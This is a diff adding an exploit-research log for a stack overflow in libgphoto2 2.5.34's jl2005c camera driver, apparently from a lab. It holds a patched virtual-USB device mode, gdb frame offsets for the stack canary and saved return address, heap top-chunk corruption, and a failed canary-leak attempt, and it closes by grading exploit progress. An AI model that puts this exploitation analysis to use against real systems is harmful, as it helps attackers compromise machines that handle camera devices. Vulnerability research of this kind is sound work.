@@ -1,0 +1,102 @@
+# W166 (2026-11-23): canary-safe partial-reply / heap-metadata lane, closed negative
+#
+# All runs: real libgphoto2 2.5.34 source, plain (no ASan) build in
+# src/libgphoto2-2.5.34-plain (CFLAGS '-O0 -g -fPIC -fno-omit-frame-pointer'),
+# lab-patched vusb device, driver live/real_init_plain. Env for every run:
+#   P=$PWD/lab/frontier/libgphoto2shell/src/libgphoto2-2.5.34-plain/installdir-plain
+#   CAMLIBS=$P/lib/libgphoto2/2.5.34
+#   IOLIBS=$P/lib/libgphoto2_port/0.12.2 IOLIBS_PREFIX=vusb
+#   LD_LIBRARY_PATH=$P/lib
+#   M2SHELL_JL2005_VUSB=<mode> M2SHELL_JL2005_COUNT=<count>
+#   port usb:001,001
+#
+# The committed patch live/vusb-jl2005.patch and all pins are UNCHANGED. A
+# local-only mode 'p' was added to the untracked plain build tree's
+# libgphoto2_port/vusb/vusb.c (then `make -C libgphoto2_port -j4` and copy
+# libgphoto2_port/.libs/vusb.so over installdir-plain/lib/libgphoto2_port/
+# 0.12.2/vusb.so) to make the device reply shorter than the requested 0x4000:
+#
+#   int n = size;
+#   if (m2[0] == 's' && n > 0x3E20) n = 0x3E20;
+#   if (m2[0] == 'p') {
+#           const char *ls = getenv("M2SHELL_JL2005_LEN");
+#           int lim = ls ? (int)strtol(ls, NULL, 0) : 0x3E38;
+#           if (n > lim) n = lim;
+#   }
+#   memset(bytes, 0x5a, (size_t)n);
+#   return n;
+#
+# A short bulk reply is a normal USB behaviour; the vulnerable code ignores
+# gp_port_read()'s return value. The memmove length at :154 still comes from
+# the device-reported count, so a short reply separates the stack write from
+# the heap source over-read.
+
+=== measured frame geometry (count 1022, breakpoint jl2005c.c:155) ===
+Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
+155             memmove(priv->table, info + 0x30, alloc_table_size - 0x30);
+INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440
+
+info starts at rbp-16440. Buffer info[0x4020] ends at info+16416. The
+canary sits at info+16424 (0x4028), the saved RIP at info+16440 (0x4038).
+The memmove source byte that lands on the following heap chunk's size field
+is info+0x30+0x4000 = info+0x4030: eight bytes PAST the canary and eight
+bytes BEFORE the saved RIP. Ordering is structural in this frame:
+    info+0x4020  buffer end
+    info+0x4028  stack canary
+    info+0x4030  source of heap top-chunk size
+    info+0x4038  saved RIP
+
+=== full reply (mode 1): device controls top size but loses the canary ===
+Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
+INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440
+0x555555567630: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
+0x555555567640: 0x5a5a5a5a5a5a5a5a  0x5a5a5a5a5a5a5a5a
+*** stack smashing detected ***: terminated
+rc=134
+
+=== canary-safe partial reply (mode p, LEN=0x3E28): canary survives, top does not ===
+model_index=0
+port_index=0 path=usb:001,001
+gp_camera_init rc=0
+rc=0
+
+Breakpoint 2, jl2005c_init (...) at jl2005c/jl2005c.c:155
+INFO=0x7fffffff8940 RBP=0x7fffffffc970 CANARY_OFF=16424 RIP_OFF=16440
+0x555555567620: 0x5a5a5a5a5a5a5a5a  0x544ee006d665bd00
+0x555555567630: 0x00007fffffffca50  0x00007ffff7bf4a80
+
+Separate run, count 1024, same LEN=0x3E28, gdb expression check:
+CANARY=c4a763d9bc511700 HEAP=c4a763d9bc511700 TOP=00007fffffffca70
+
+The source over-read copies the live stack canary verbatim into
+priv->table+0x3FF8 (byte offset 16376) on every overflowing count. A second
+run showed a different, still low-byte-zero canary there
+(0x22c3906d8aeac900). But the same memmove writes leftover stack bytes over
+the top chunk's size field (0x00007fffffffca50 / ...ca70). table is followed
+by the top chunk in this build: immediately before the memmove,
+table+0x4000 held the original top size 0x129d1. There is no live neighbour
+object to hit.
+
+=== consumer-visible leak attempt (negative) ===
+Local-only driver live/canary_leak_probe.c calls the real APIs
+gp_camera_folder_list_files() and gp_camera_file_get(cam, "/",
+"jl_1023.ppm", GP_FILE_TYPE_NORMAL, ...). With count 1024 and the canary-safe
+partial reply (nb_entries=1024 still rounds to 0x4200, so file jl_1023.ppm
+is listed and its 16-byte table entry at table+0x3FF0 contains the canary):
+
+malloc(): corrupted top size
+rc=134
+
+get_file_func's malloc(b + HEADERSIZE) (library.c:208, real source) aborts on
+the corrupted top chunk before any file bytes are returned. The heap copy of
+the canary is therefore not consumer-visible on this path.
+
+=== disposition ===
+A device-only partial reply cannot preserve the canary and still control
+either the saved RIP or the heap top-chunk size: both source offsets lie at
+or past the canary. Leaking the canary into the heap is real but the same
+overflow destroys the allocator metadata, and the first real consumer
+allocation aborts before the leak can be returned. Grade unchanged: rung 3
+at the real heap destination, rung 4 chosen bytes at a control-flow slot
+blocked by the protector, rung 5 UNKNOWN. No pin, committed patch, harness
+or witness verdict was changed.
